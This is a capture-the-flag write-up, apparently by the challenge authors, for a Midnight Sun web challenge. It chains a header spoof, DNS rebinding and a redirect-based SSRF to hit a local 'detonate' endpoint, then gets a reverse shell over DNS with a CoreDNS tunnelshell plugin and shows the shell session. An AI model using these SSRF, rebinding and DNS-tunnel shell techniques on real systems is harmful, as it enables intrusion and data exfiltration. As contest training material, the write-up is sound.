#Exploitation

## Putting together the inital request:

1) 
X-Forwarded-For bypass:
- Just include the IP in the header

2) IP check bypass
Include multiple IPs in a domain or use DNS rebinding (like rbndr.us). DNS Rebinding was the intended solution

3) Triggring detonate and bypass the 127.0.0.1 ip check:

Host redir.py which will send a 302 redirect to SSRF the webserver into making a local request calling the detonate endpoints.

python3 redir.py 80 http://127.0.0.1:15555/detonate?name=supersecretabc123xyz\&url=http://0x0y0z/payload


Our trigger looks like this
curl -H "X-Forwarded-For: 95.173.136.71" kgb.target:15555/scan?url=http://0x0y0z.d5184c01.rbndr.us/

## Stage 2 -- Detonator

The hint for the challenge says `DeNiS Sergeev wants a secret mission payload.`, alluding to DNS. 

1) Run coredns with the https://github.com/adc/coredns-tunnelshell plugin installed. 

You can use a configuration like this:

tunnel.yourdomain.com {
  hosts {
	95.173.136.72 kgb.tunnel.yourdomain.com
	1.2.3.4 kgb.tunnel.yourdomain.com
	fallthrough
  }

  tunnelshell

  log
  errors
}


curl -H "X-Forwarded-For: 95.173.136.71" kgb.target:15555/scan?url=http://0x0y0z.d5184c01.rbndr.us/


2) Connect to the coredns socket and wait for a connection to show up
nc localhost 1337

In coredns you'll know when the reverse tunnel works when you see requests coming in

[INFO] 162.158.104.220:34913 - 24862 "TXT IN 2420-0-660faeac.tunnel.yourdomain.com. udp 63 true 1452" NOERROR qr,aa 100 0.000447496s
[INFO] 162.158.104.148:59983 - 7850 "TXT IN 00-1-2317440.tunnel.yourdomain.com. udp 60 true 1452" NOERROR qr,aa 94 0.000248969s
[INFO] 162.158.104.148:22594 - 53984 "TXT IN 00-2-5d586564.tunnel.yourdomain.com. udp 61 true 1452" NOERROR qr,aa 96 0.000110636s
[INFO] 162.158.104.148:63962 - 48204 "TXT IN 00-3-105ae3a3.tunnel.yourdomain.com. udp 61 true 1452" NOERROR qr,aa 96 0.00010058s
[INFO] 162.158.104.149:65071 - 57369 "TXT IN 00-4-22e00cc.tunnel.yourdomain.com. udp 60 true 1452" NOERROR qr,aa 94 0.000239648s
[INFO] 162.158.104.148:29410 - 15723 "TXT IN 00-5-6c60fe9a.tunnel.yourdomain.com. udp 61 true 1452" NOERROR qr,aa 96 0.00022385s
[INFO] 162.158.104.220:46404 - 39031 "TXT IN 00-6-4aae60dc.tunnel.yourdomain.com. udp 61 true 1452" NOERROR qr,aa 96 0.000100155s

```
bash-3.2# nc localhost 1337
[+] connected to coredns-tunnelshell

$ uname -a
Linux dbed26620181 5.17.0-051700-generic #202203202130 SMP PREEMPT Sun Mar 20 21:33:41 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
$ ls
bin	     etc    lib64				 mnt   run   tmp
boot	     home   libx32				 opt   sbin  usr
detonations  lib    media				 proc  srv   var
dev	     lib32  midnightsun.ctf.kgbfskfsb_detonator  root  sys
$ ls -al
total 6416
drwxr-xr-x   1 root   root    4096 Apr  4 04:31 .
drwxr-xr-x   1 root   root    4096 Apr  4 04:31 ..
drwxr-xr-x   1 root   root    4096 Apr  4 04:30 .do
-rwxr-xr-x   1 root   root       0 Apr  4 04:31 .dockerenv
lrwxrwxrwx   1 root   root       7 Mar 15 11:49 bin -> usr/bin
drwxr-xr-x   2 root   root    4096 Nov  8 11:34 boot
drwxr-xr-x   2 nobody root    4096 Apr  4 04:20 detonations
drwxr-xr-x   5 root   root     340 Apr  4 04:31 dev
drwxr-xr-x   1 root   root    4096 Apr  4 04:31 etc
drwxr-xr-x   2 root   root    4096 Nov  8 11:34 home
lrwxrwxrwx   1 root   root       7 Mar 15 11:49 lib -> usr/lib
lrwxrwxrwx   1 root   root       9 Mar 15 11:49 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root       9 Mar 15 11:49 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root      10 Mar 15 11:49 libx32 -> usr/libx32
drwxr-xr-x   2 root   root    4096 Mar 15 11:49 media
-rwxr-xr-x   1 root   root 6501290 Apr  4 04:30 midnightsun.ctf.kgbfskfsb_detonator
drwxr-xr-x   2 root   root    4096 Mar 15 11:49 mnt
drwxr-xr-x   2 root   root    4096 Mar 15 11:49 opt
dr-xr-xr-x 418 root   root       0 Apr  4 04:31 proc
drwx------   2 root   root    4096 Mar 15 11:52 root
drwxr-xr-x   5 root   root    4096 Mar 15 11:52 run
lrwxrwxrwx   1 root   root       8 Mar 15 11:49 sbin -> usr/sbin
drwxr-xr-x   2 root   root    4096 Mar 15 11:49 srv
dr-xr-xr-x  13 root   root       0 Apr  4 04:31 sys
drwxrwxrwt   1 root   root    4096 Apr  3 00:05 tmp
drwxr-xr-x  14 root   root    4096 Mar 15 11:49 usr
drwxr-xr-x   1 root   root    4096 Mar 15 11:52 var
$ ls -R .do
.do:
you

.do/you:
see

.do/you/see:
the

.do/you/see/the:
answer

.do/you/see/the/answer:
runme
$ .do/you/see/the/answer/runme
1070352547 +1 = ?
1070352548
midnight{flag}

```


## MISC:

Some teams were using chashell and it failed for them. Chashell has a bug where they dont set the authoritative flag.
You can patch their server code with	

```
m.MsgHdr.Authoritative = true 
```


## Other solutions

Some teams decided to re-exploit 'kgbfskfsb' as an alternative to DNS. This is a bit harder and unreliable, but a very valid
way to exfiltrate data back out of the system. When exploiting the service it would fetch the team's URL to relay information.

The docker set up does not stop this



